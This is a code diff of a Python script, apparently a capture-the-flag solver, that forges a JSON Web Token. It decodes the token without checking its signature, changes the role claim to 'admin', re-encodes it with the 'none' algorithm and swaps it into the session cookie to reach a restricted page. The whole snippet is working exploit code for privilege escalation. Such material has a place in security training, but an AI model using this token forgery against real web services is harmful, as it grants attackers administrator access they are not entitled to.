@@ -61,15 +61,17 @@ def main():
                 header = jwt.get_unverified_header(jwttoken) # get the jwt token header, figure out which algorithm the web server is using
                 logging.info("jwt token header: %s\n"%header)
 
-                payload = jwt.decode(jwttoken, verify=False) # decode the jwo token payload, the user role information is claimed in the payload
+                payload = jwt.decode(jwttoken, options={
+                                     "verify_signature": False})
+                # decode the jwo token payload, the user role information is claimed in the payload
                 logging.info("jwt token payload: %s\n"%payload)
 
                 payload["role"] = "admin"
                 fake_jwttoken = jwt.encode(payload, None, algorithm="none") # update the user role and regenerate the jwt token using "none" algorithm
                 logging.info("regenerate a jwt token using 'none' algorithm and changing the role into 'admin'")
-                logging.info(fake_jwttoken.decode("utf-8") + "\n")
+                logging.info(fake_jwttoken + "\n")
                 
-                cookie.value = fake_jwttoken.decode("utf-8")
+                cookie.value = fake_jwttoken
                 break
         flag_page = session_requests.get(private_page_url, headers = headers) # let's visit the restricted page again
         logging.info("\n" + flag_page.text + "\n") # now the webpage should contain the flag information
